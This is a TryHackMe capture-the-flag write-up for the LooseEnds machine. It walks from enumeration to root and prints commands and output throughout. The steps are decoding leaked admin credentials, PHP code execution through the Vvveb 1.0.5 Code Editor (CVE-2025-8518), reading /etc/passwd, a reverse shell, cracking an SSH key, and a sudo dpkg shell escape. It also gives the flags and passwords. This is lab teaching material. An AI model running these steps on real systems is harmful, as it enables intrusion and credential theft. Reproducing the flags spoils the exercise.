# TryHackMe – LooseEnds Writeup


---

# 🔎 Network Discovery

First, scan the target for open ports and running services using Nmap.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.99
```

### Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.99
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 05:42 -0700
Nmap scan report for 192.168.1.99
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
| http-robots.txt: 7 disallowed entries 
| /admin/* /search/ /user/* /cart/* /checkout/* 
|_/filters-*/ /shop/*/*/filters-*
|_http-title: Vvveb
|_http-server-header: Apache/2.4.68 (Debian)
MAC Address: 08:00:27:9E:D3:41 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.85 seconds
```

We can see that ports **22** and **80** are open.

- **22/tcp** — SSH
- **80/tcp** — HTTP

The HTTP service identifies the application as `Vvveb`.

---

# 🌐 Web Enumeration

Let's open port `80` in the browser.

<img width="1918" height="854" alt="Screenshot_2026-10-05_05_44_10" src="https://github.com/user-attachments/assets/037b2b79-ada9-4327-92c3-ff0e14619057" />

The website presents:

> **Vvveb - The next generation website builder**

## Identifying the Version

Viewing the website's source code 

<img width="1918" height="860" alt="Screenshot_2026-10-05_05_45_36" src="https://github.com/user-attachments/assets/274dc193-c77e-4959-938c-955150872857" />

Reveals the installed version:

```text
Vvveb CMS 1.0.5
```

The `Vvveb CMS 1.0.5` vulnerability is a critical security flaw `(CVE-2025-8518)` that allows 
logged-in administrators or attackers with template-editing privileges to achieve `Remote Code Execution (RCE)`. 
The issue exists because the platform's built-in "`Code Editor`" tool fails to properly check and clean files during the saving process. 
By abusing this flaw, an attacker can inject malicious code directly into the website's files, effectively giving them complete control over the web server. 

Therefore, obtaining administrator access becomes our first objective.

---

# 📂 Directory Enumeration

Let's enumerate the web application using Gobuster.

```bash
gobuster dir -u http://192.168.1.99/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
--exclude-length "29457,29162" -s "200,301,302" -b ""
```

### Results

```text
$ gobuster dir -u http://192.168.1.99/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --exclude-length "29457,29162" -s "200,301,302" -b ""

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.1.99/
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:     200,301,302
[+] Exclude Length:   29457,29162
[+] User Agent:       gobuster/3.8.2
[+] Timeout:          10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
2022                 (Status: 200) [Size: 60456]
LICENSE              (Status: 200) [Size: 34523]
admin                (Status: 301) [Size: 352] [--> http://192.168.1.99/admin/]
app                  (Status: 301) [Size: 350] [--> http://192.168.1.99/app/]
blog                 (Status: 200) [Size: 66287]
brand                (Status: 200) [Size: 46740]
checkout             (Status: 302) [Size: 181] [--> /cart]
comment-page-1       (Status: 200) [Size: 38754]
config               (Status: 301) [Size: 353] [--> http://192.168.1.99/config/]
install              (Status: 301) [Size: 354] [--> http://192.168.1.99/install/]
php.ini              (Status: 200) [Size: 683]
plugins              (Status: 301) [Size: 354] [--> http://192.168.1.99/plugins/]
public               (Status: 301) [Size: 353] [--> http://192.168.1.99/public/]
radmind-1            (Status: 200) [Size: 38749]
robots.txt           (Status: 200) [Size: 313]
search               (Status: 200) [Size: 55822]
shop                 (Status: 200) [Size: 20196]
system               (Status: 301) [Size: 353] [--> http://192.168.1.99/system/]
user                 (Status: 302) [Size: 181] [--> /user/login]
vendor               (Status: 200) [Size: 49853]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

The `/admin/` directory looks particularly interesting.

Navigating to it:

<img width="1918" height="852" alt="Screenshot_2026-10-05_05_53_29" src="https://github.com/user-attachments/assets/af40da7e-b49e-4d2d-8295-dc8b19824f87" />

Reveals an administrator login page.

We don't have the credentials yet, so let's enumerate the application further.

---

# 🔍 Enumerating the `config` Directory

The `config` directory looks interesting, so let's fuzz it separately.

```bash
gobuster dir -u http://192.168.1.99/config \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
--exclude-length "29457,29162" -s "200,301,302" -b ""
```

### Results

```text
$ gobuster dir -u http://192.168.1.99/config -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --exclude-length "29457,29162" -s "200,301,302" -b ""

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.1.99/config
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:     302,200,301
[+] Exclude Length:   29457,29162
[+] User Agent:       gobuster/3.8.2
[+] Timeout:          10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
forums               (Status: 200) [Size: 29653]
secret               (Status: 200) [Size: 663]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

The `/config/secret` endpoint returns HTTP `200`, so let's inspect it.

```bash
curl http://192.168.1.99/config/secret
```

The response contains hexadecimal-looking data:

```text
30 30 30 30 30 30 30 30 20 20 35 39 20 35 37 20 35 32 20 37 34 20 36 31 20 35 37 20 33 34 20 36 37 20 34 66 20 36 39 20 34 32 20 34 64 20 35 39 20 35 37 20 34 61 20 34 32 20 20 7c 59 57 52 74 61 57 34 67 4f 69 42 4d 59 57 4a 42 7c 0a 30 30 30 30 30 30 31 30 20 20 35 61 20 34 37 20 33 31 20 37 30 20 36 32 20 36 39 20 34 35 20 37 39 20 34 64 20 34 34 20 34 39 20 33 32 20 34 39 20 37 61 20 34 32 20 33 34 20 20 7c 5a 47 31 70 62 69 45 79 4d 44 49 32 49 7a 42 34 7c 0a 30 30 30 30 30 30 32 30 20 20 34 66 20 35 31 20 33 64 20 33 64 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7c 4f 51 3d 3d 7c```

This appears to be encoded multiple times.

Using CyberChef with the following sequence:

```text
From HEX
    ↓
From Hexdump
    ↓
From Base64
```

<img width="1918" height="855" alt="Screenshot_2026-10-05_06_03_51" src="https://github.com/user-attachments/assets/17aa2f7f-ad3e-4c34-95e8-cfdbb02047e9" />


reveals the administrator credentials.

```text
admin : [PASSWORD]
```

---

# 🔐 Web - Administrator Access

We can now log into the Vvveb administrator panel using:

```text
Username: admin
Password: [PASSWORD]
```

The Vvveb administrator panel was successfully accessed.

<img width="1918" height="865" alt="Screenshot_2026-09-05_09_39_53" src="https://github.com/user-attachments/assets/0c3cf90e-22c9-4d01-a1e4-ac5bd60da316" />

This gives us the privileges required to exploit the Vvveb CMS vulnerability.

---

# 💥 Exploiting CVE-2025-8518

The installed Vvveb version is:

```text
Vvveb CMS 1.0.5
```




The application provided a **Themes → Code Editor** functionality that allowed modification of PHP theme files.

<img width="1918" height="895" alt="Screenshot_2026-09-05_09_41_06" src="https://github.com/user-attachments/assets/2f924d1b-9457-4aeb-bf4c-a24c6bc37567" />

Navigation:

```text
Themes
  └── Code Editor
        └── landing
              └── theme.php
```

<img width="1918" height="852" alt="Screenshot_2026-10-05_08_05_33" src="https://github.com/user-attachments/assets/f23dd838-3961-47fa-8095-cf3da780c196" />

Scroll to bottom click on `Edit`.

<img width="1918" height="902" alt="Screenshot_2026-09-05_09_42_21" src="https://github.com/user-attachments/assets/f05a5a92-1479-466f-a33d-d660266e1bcb" />

---

##  Testing Arbitrary PHP Code Execution

The `theme.php` file was modified to test whether PHP code could be executed.

```php
<?php
$file = '/etc/passwd';

if (file_exists($file) && is_readable($file)) {
    $content = file_get_contents($file);
    echo nl2br(htmlspecialchars($content));
} else {
    echo "The file is not readable or does not exist.";
}
?>
```

<img width="1722" height="732" alt="Screenshot_2026-09-05_09_43_37" src="https://github.com/user-attachments/assets/0d879d78-bb67-40f0-af5e-93a8089d4cb7" />


After saving the modification, 

<img width="1918" height="893" alt="Screenshot_2026-09-05_09_43_46" src="https://github.com/user-attachments/assets/b9b5fd38-8dd9-46dd-a7e8-bc10d86725d0" />

Now let's click the `Edit Website` option from the right-side menu and open the `source page` of the site.

<img width="1918" height="811" alt="Screenshot_2026-09-05_09_43_57" src="https://github.com/user-attachments/assets/1726aef8-fe14-473f-9765-a460be88a237" />

The injected PHP code executed successfully and displayed the contents of: `/etc/passwd`

This confirmed **arbitrary PHP code execution** through the authenticated Vvveb code editor.

> This should be described as **arbitrary PHP code execution / Remote Code Execution (RCE)** rather than command injection.

---

# 👤 User Enumeration


The `/etc/passwd` file revealed several local accounts.

Two interesting users were:

```text
bunny
zer0arc4
```

This provided potential targets for further privilege escalation and lateral movement.

---

# 🐚 Reverse Shell


A PHP reverse-shell payload was placed into the same editable PHP file.

On the attacker machine, a Netcat listener was started:

```bash
nc -lnvp 443
```
Now let's follow the same steps we did previously :
```

```text
Themes
  └── Code Editor
        └── landing
              └── theme.php
```
But now let's upload the `Pentestmonkey PHP` reverse shell code from [Revshell.com](https://www.revshells.com/) and save and triggering the modified PHP page.

A reverse shell was received and was running as:


The listener receives the connection:

```text
listening on [any] 443 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.99] 57010

Linux LooseEnds 6.12.111+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.111-1 (2026-09-28) x86_64 GNU/Linux

uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
```

Check our current identity:

```bash
id
whoami
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

We now have a shell as:

```text
www-data
```

---

# 🖥️ TTY Upgrade

Upgrade the reverse shell to a more interactive TTY:

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then run:

```bash
stty raw -echo; fg
```

Next:

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The reverse shell is now upgraded to an interactive terminal.

---

# 🔎 Credential Enumeration

Standard privilege-escalation checks were performed, including:

- SUID binaries
- Linux capabilities
- `sudo -l`

Nothing immediately useful was discovered.

Next, search for configuration files containing credentials.

An interesting file is:

```text
/var/www/vvveb/config/db.php
```

Read the file:

```bash
cat /var/www/vvveb/config/db.php
```

### Output

```php
<?php
 return array (
  'default' => 'mysqli',
  'connections' =>
  array (
    'mysqli' =>
    array (
      'engine' => 'mysqli',
      'host' => '127.0.0.1',
      'database' => 'vvveb',
      'user' => 'bunny',
      'password' => '[PASSWORD]',
      'port' => NULL,
      'prefix' => '',
    ),
  ),
);
```

The configuration file contains credentials for the `bunny` account.

This suggests that the same credentials may be reused for system access.

---

# 👤 SSH Access as Bunny

Try the discovered credentials over SSH:

```bash
ssh bunny@192.168.1.99
```

After entering the recovered password, we obtain a shell as `bunny`.

Verify our privileges:

```bash
id
whoami
```

Output:

```text
uid=1001(bunny) gid=1001(bunny) groups=1001(bunny),100(users),1002(monkeys)
bunny
```

We have successfully logged in as `bunny`.

The account is also a member of the interesting group:

```text
monkeys
```

---

# 🔑 Accessing Zer0arc4's SSH Key

Let's search for files belonging to the `monkeys` group:

```bash
find / -group monkeys 2>/dev/null
```

Output:

```text
/home/zer0arc4/.ssh
/home/zer0arc4/.ssh/id_ed25519
```

Because `bunny` is a member of the `monkeys` group, we can access the SSH private key belonging to `zer0arc4`.

Copy the private key to the attacking machine and prepare it for cracking.

The key is:

```text
id_ed25519
```

Convert the key to a John the Ripper-compatible hash and crack it using `rockyou.txt`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Result

```text
1g 0:00:06:14 DONE
0.002668g/s 24.71p/s 24.71c/s
```

The private-key passphrase was successfully recovered.

---

# 🖥️ SSH Access as Zer0arc4

Use the recovered passphrase with the private key:

```bash
ssh -i id_ed25519 zer0arc4@192.168.1.99
```

After entering the recovered passphrase, we obtain a shell as `zer0arc4`.

Verify:

```bash
id
whoami
```

Output:

```text
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),104(bluetooth),1002(monkeys)
zer0arc4
```

We have successfully moved from:

```text
www-data → bunny → zer0arc4
```

---

# 🚩 User Flag

The user flag is located in the `zer0arc4` home directory.

```bash
cat /home/zer0arc4/user.txt
```

```text
THM{QWxha2F0aSBVbWVzaCBDaGFuZHJhCg}
```

---

# ⬆️ Privilege Escalation to Root

Now let's check the commands that `zer0arc4` can execute with `sudo`.

```bash
sudo -l
```

### Output

```text
Matching Defaults entries for zer0arc4 on LooseEnds:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on LooseEnds:
    (root) NOPASSWD: /usr/bin/dpkg
```

We can execute:

```text
/usr/bin/dpkg
```

as `root` without providing a password.

---

# 💣 Exploiting Sudo `dpkg`

Run:

```bash
sudo /usr/bin/dpkg -l
```

This opens the package list interface.

From the interface, press:

```text
ESC
```

to access the command prompt.

Enter:

```text
!/bin/bash -p
```

This launches a privileged Bash shell.

Verify our privileges:

```bash
id
whoami
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

We have successfully obtained a root shell.

---

# 🚩 Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

```text
THM{QWxha2F0aSBSYWphbWFuaSBWZW5rYW5uYQo}
```

---

# 🧾 Attack Path Summary

```text
Nmap
 │
 ├── 22/tcp → SSH
 └── 80/tcp → Vvveb CMS 1.0.5
                  │
                  ▼
            Source Enumeration
                  │
                  ▼
         Identify Vvveb 1.0.5
                  │
                  ▼
             Gobuster
                  │
                  ▼
            /config/secret
                  │
                  ▼
        HEX → Hexdump → Base64
                  │
                  ▼
       admin : scottgreen
                  │
                  ▼
           Admin Panel
                  │
                  ▼
          CVE-2025-8518
                  │
                  ▼
          Vvveb Code Editor
                  │
                  ▼
          PHP Code Execution
                  │
                  ▼
          Reverse Shell
                  │
                  ▼
            www-data
                  │
                  ▼
       /var/www/vvveb/config/db.php
                  │
                  ▼
          Bunny Credentials
                  │
                  ▼
             SSH as bunny
                  │
                  ▼
          Group: monkeys
                  │
                  ▼
    /home/zer0arc4/.ssh/id_ed25519
                  │
                  ▼
       Crack SSH Passphrase
                  │
                  ▼
          SSH as zer0arc4
                  │
                  ▼
              sudo -l
                  │
                  ▼
       NOPASSWD: /usr/bin/dpkg
                  │
                  ▼
       dpkg → !/bin/bash -p
                  │
                  ▼
               ROOT
```

---

# 🧾 Summary

The initial attack surface consisted of SSH and an Apache-hosted Vvveb CMS installation.

Enumeration revealed **Vvveb CMS 1.0.5**. Further directory enumeration uncovered `/config/secret`, which contained multiple layers of encoding. Decoding the data using **HEX → Hexdump → Base64** revealed administrator credentials:

```text
admin : scottgreen
```

After authenticating to the administrator panel, the vulnerable Vvveb Code Editor was abused through **CVE-2025-8518** to execute arbitrary PHP code.

A reverse shell was obtained as:

```text
www-data
```

The Vvveb database configuration then exposed credentials for the `bunny` account. These credentials were reused for SSH access.

The `bunny` account belonged to the `monkeys` group, which provided access to:

```text
/home/zer0arc4/.ssh/id_ed25519
```

After cracking the SSH key's passphrase, SSH access was obtained as `zer0arc4`.

Finally, `sudo -l` revealed that `zer0arc4` could execute `/usr/bin/dpkg` as root without a password. Using `dpkg` to launch a privileged Bash shell resulted in complete root access.

---

# 🚀 Key Takeaways

### 1. Always identify application versions

The exposed Vvveb version immediately provided an important lead:

```text
Vvveb CMS 1.0.5
```

Version enumeration can reveal known vulnerabilities.

### 2. Enumerate interesting directories deeply

The initial Gobuster scan discovered `/config/`, but further enumeration of that directory revealed:

```text
/config/secret
```

Nested directory enumeration can expose sensitive files missed during the first scan.

### 3. Look for encoded secrets

The `/config/secret` file was not immediately readable, but recognizing the hexadecimal representation and decoding it through multiple stages exposed administrator credentials.

### 4. Check configuration files for credentials

The Vvveb database configuration contained credentials for another local account:

```text
user = bunny
```

Application configuration files are often valuable during post-exploitation enumeration.

### 5. Check group memberships

The `bunny` account belonged to:

```text
monkeys
```

Searching for files owned by that group exposed another user's SSH private key.

### 6. Credentials and keys can lead to lateral movement

The attack path moved through multiple accounts:

```text
www-data → bunny → zer0arc4 → root
```

Each account provided access to additional resources.

### 7. Always check `sudo -l`

The final privilege escalation was straightforward once the following permission was discovered:

```text
(root) NOPASSWD: /usr/bin/dpkg
```

---

# 🏴 Rooted

**Initial Access:** Vvveb CMS RCE  
**Initial User:** `www-data`  
**Lateral Movement:** `www-data → bunny → zer0arc4`  
**Privilege Escalation:** Sudo `dpkg`  
**Root:** `root`

### Flag 1 — Admin Password

```text
admin : scottgreen
```

### Flag 2 — User Flag

```text
THM{QWxha2F0aSBVbWVzaCBDaGFuZHJhCg}
```

### Flag 3 — Root Flag

```text
THM{QWxha2F0aSBSYWphbWFuaSBWZW5rYW5uYQo}
```

---

**Author:** zer0arc4
